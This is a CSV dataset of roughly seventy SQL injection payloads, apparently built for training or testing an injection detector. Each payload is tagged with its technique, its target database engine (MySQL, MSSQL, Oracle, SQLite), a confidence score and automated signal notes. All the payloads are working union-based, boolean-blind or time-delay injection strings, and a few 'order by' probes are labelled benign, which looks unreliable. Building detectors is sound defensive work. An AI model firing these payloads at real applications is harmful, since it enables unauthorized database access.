id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22588,"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""rtzn"" = ""rtzn",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22420,"-4259' ) ) as usqu where 5419 = 5419 or elt ( 8325 = 8837,8837 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
22424,1%' order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 16 chars.,2
22494,"-3581'|| ( select 'uxmh' from dual where 8954 = 8954 union all select 8954,8954,8954,8954,8954,8954#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
22506,1 ) ) as pynj where 7683 = 7683 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
22532,"-9526 where 5734 = 5734 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
22542,1%' ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
22555,1' ) ) ) waitfor delay '0:0:5' and ( ( ( 'clcf' = 'clcf,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
22574,"-2860"" ) ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 22 chars.,2
22400,"1 union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
22402,"-7531' ) ) ) union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
22405,1' ) where 8707 = 8707 and 3210 = 1477--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
22419,1' in boolean mode ) and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
22423,"-4606"" ) as elek where 8261 = 8261 or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
22425,"-1591 where 3291 = 3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",union_based,generic,0.7,UNION-based payload detected. Payload length: 86 chars.,2
22426,"-8069 ) ) as sxbn where 7689 = 7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",union_based,generic,0.7,UNION-based payload detected. Payload length: 104 chars.,2
22427,"1' ) ) ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
22432,"-6116"" ) ) union all select 3679,3679,3679,3679,3679,3679,3679--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
22434,"-2153'|| ( select 'sofs' where 4126 = 4126 union all select 4126,4126,4126,4126,4126#",union_based,generic,0.7,UNION-based payload detected. Payload length: 85 chars.,2
22437,"1' ) ) as ticp where 9794 = 9794 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 91 chars.,2
22438,"1' union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
22442,"-9451%"" ) union all select 9963,9963,9963--",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
22449,"-6155%' ) ) union all select 2421,2421,2421,2421,2421#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
22456,"-4694%"" ) ) ) union all select 9178,9178,9178,9178,9178--",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
22459,1 ) ) ) and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22461,"-8783' ) ) union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
22462,-8032%' ) ) ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
22465,"1%"" ) ) ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
22468,"-8773%' ) ) ) union all select 8941,8941,8941,8941,8941,8941#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
22469,"-2001'+ ( select 'nput' where 8368 = 8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",union_based,generic,0.7,UNION-based payload detected. Payload length: 104 chars.,2
22473,"-7146"" where 6431 = 6431 or 8548 = 5549--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
22475,-1396 where 5838 = 5838 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
22477,1' ) where 4509 = 4509 union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
22478,"1 ) as caoa where 6139 = 6139 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
22482,-4803%' ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
22487,"-8034"" or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22491,"-5145' where 2334 = 2334 union all select 2334,2334,2334,2334--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
22492,"-2168 ) union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
22503,1 ) ) and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
22504,1%' ) ) and 1651 = 9324 and ( ( '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
22509,1%' and 6454 = 8348 and '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 31 chars.,2
22517,"1 ) ) as zmsa where 6909 = 6909 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
22518,"1' where 4039 = 4039 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
22524,"-6629%"" ) ) ) or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 30 chars.,2
22525,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
22528,"-8054' ) ) union all select 5232,5232,5232,5232,5232,5232,5232#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
22529,-2983' ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
22534,-5854 ) ) ) union all select 5645#,union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
22538,"1%"" and 2805 = 1345",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 19 chars.,2
22545,"-7939"" ) or 3958 = 6909",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22546,"1%' ) ) ) union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
22548,-3136%' ) or 3400 = 6002,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
22554,1 and 2620 = 2175,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 17 chars.,2
22560,"1"" ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
22562,"-2006' ) ) union all select 7852,7852,7852,7852,7852--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
22568,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
22570,"1' ) ) union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
22573,"1' ) as yjdg where 5262 = 5262 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
22580,-4896' ) union all select 1929--,union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
22581,"1"" ) ) and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22582,"-9582' ) where 4397 = 4397 union all select 4397,4397,4397#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
22583,"-9110"" ) ) union all select 2263,2263,2263,2263,2263#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
22584,"-8118"" ) where 3561 = 3561 or ( 8459 = 8459 ) *4906--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,2
22591,-8023' or 6872 = 6872,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
22592,"-6067'+ ( select 'bfhf' where 3114 = 3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",union_based,generic,0.7,UNION-based payload detected. Payload length: 100 chars.,2
22593,"-9297 ) union all select 6841,6841,6841,6841,6841--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
22594,"-4905"" union all select 6082,6082--",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
22595,"1' where 3760 = 3760 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
22422,"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'iari' = 'iari",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
